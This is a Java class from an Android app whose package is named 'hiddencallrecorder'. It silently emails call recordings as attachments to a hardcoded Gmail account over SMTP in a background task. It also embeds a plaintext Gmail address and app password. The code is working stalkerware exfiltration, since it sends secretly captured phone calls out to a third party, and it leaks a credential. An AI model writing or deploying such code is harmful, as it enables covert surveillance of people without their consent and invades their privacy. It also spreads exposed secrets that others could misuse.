
package com.example.hiddencallrecorder;

import android.content.Context;
import android.os.AsyncTask;

import java.io.File;
import java.util.Properties;

import javax.mail.*;
import javax.mail.internet.*;

public class GmailSender {

    public static void sendMail(Context context, final File fileToSend) {
        final String username = "mn9503418@gmail.com";
        final String appPassword = "yzms ncdz veli whtj";

        AsyncTask.execute(() -> {
            Properties props = new Properties();
            props.put("mail.smtp.auth", "true");
            props.put("mail.smtp.starttls.enable", "true");
            props.put("mail.smtp.host", "smtp.gmail.com");
            props.put("mail.smtp.port", "587");

            Session session = Session.getInstance(props, new javax.mail.Authenticator() {
                protected PasswordAuthentication getPasswordAuthentication() {
                    return new PasswordAuthentication(username, appPassword);
                }
            });

            try {
                Message message = new MimeMessage(session);
                message.setFrom(new InternetAddress(username));
                message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(username));
                message.setSubject("Call Recording");

                MimeBodyPart messageBodyPart = new MimeBodyPart();
                messageBodyPart.setText("Attached Call Recording");

                MimeBodyPart attachmentPart = new MimeBodyPart();
                attachmentPart.attachFile(fileToSend);

                Multipart multipart = new MimeMultipart();
                multipart.addBodyPart(messageBodyPart);
                multipart.addBodyPart(attachmentPart);

                message.setContent(multipart);
                Transport.send(message);

            } catch (Exception e) {
                e.printStackTrace();
            }
        });
    }
}
